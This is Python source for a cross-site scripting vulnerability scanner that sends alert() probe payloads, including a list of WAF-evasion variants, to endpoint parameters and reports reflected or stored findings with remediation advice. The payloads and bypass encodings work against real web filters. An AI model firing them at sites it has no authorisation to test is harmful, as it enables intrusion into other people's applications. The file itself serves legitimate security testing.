"""
XSS Scanner — Reflected & Stored XSS detection
Includes WAF bypass payload variants
"""

import requests
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


class XSSScanner:
    # Core payloads
    BASE_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "javascript:alert(1)",
        "<body onload=alert(1)>",
    ]

    # WAF bypass variants
    WAF_BYPASS_PAYLOADS = [
        # Unicode normalization
        "\u003cscript\u003ealert(1)\u003c/script\u003e",
        # Mixed case
        "<ScRiPt>alert(1)</sCrIpT>",
        # HTML entity encode
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        # Double encode
        "%253Cscript%253Ealert(1)%253C/script%253E",
        # Comment obfuscation
        "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
        # Null byte
        "<scri\x00pt>alert(1)</scri\x00pt>",
        # Tab injection
        "<img\tsrc=x\tonerror=alert(1)>",
    ]

    def __init__(self, target, endpoints, waf_detected=None):
        self.target = target
        self.endpoints = endpoints
        self.waf_detected = waf_detected
        self.request_count = 0
        self.bypass_rate = 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnScan Security Tester)"})
        self.session.timeout = 8

    def run(self):
        findings = []
        payloads = self.BASE_PAYLOADS
        if self.waf_detected:
            payloads = payloads + self.WAF_BYPASS_PAYLOADS

        bypass_hits = 0
        total_tries = 0

        for endpoint in self.endpoints:
            url = endpoint.get("url", "")
            params = endpoint.get("params", [])
            method = endpoint.get("method", "GET").upper()

            if not params:
                continue

            for param in params:
                for payload in payloads:
                    total_tries += 1
                    try:
                        result = self._test_payload(url, param, payload, method)
                        self.request_count += 1

                        if result["reflected"] or result["stored"]:
                            vuln_type = "Stored XSS" if result["stored"] else "Reflected XSS"
                            bypass_used = payload in self.WAF_BYPASS_PAYLOADS
                            if bypass_used:
                                bypass_hits += 1

                            findings.append({
                                "type": vuln_type,
                                "severity": "critical" if result["stored"] else "medium",
                                "endpoint": f"{url}?{param}=",
                                "parameter": param,
                                "payload": payload,
                                "cvss": "9.3" if result["stored"] else "6.1",
                                "vector": "XSS",
                                "bypass_used": bypass_used,
                                "bypass_technique": "WAF evasion via encoding" if bypass_used else None,
                                "remediation": (
                                    "Encode all user output. Use Content-Security-Policy. "
                                    "Validate and sanitize input server-side."
                                ),
                            })
                            break  # Found vuln in this param, move on

                    except requests.RequestException:
                        pass
                    time.sleep(0.05)  # Rate limiting

        if total_tries > 0:
            self.bypass_rate = round((bypass_hits / total_tries) * 100, 1)

        return findings

    def _test_payload(self, url, param, payload, method):
        """Send payload and check if it's reflected in response."""
        marker = f"VULNSCAN_{hash(payload) & 0xFFFF}"
        tagged_payload = payload.replace("alert(1)", f"alert('{marker}')")

        try:
            if method == "GET":
                params = {param: tagged_payload}
                resp = self.session.get(url, params=params, allow_redirects=True)
            else:
                data = {param: tagged_payload}
                resp = self.session.post(url, data=data, allow_redirects=True)

            body = resp.text
            reflected = tagged_payload in body or payload in body
            # Rough heuristic for stored: check if untagged payload appears on a GET to same URL
            stored = False
            if reflected and method == "POST":
                check = self.session.get(url)
                stored = payload in check.text

            return {"reflected": reflected, "stored": stored}

        except Exception:
            return {"reflected": False, "stored": False}
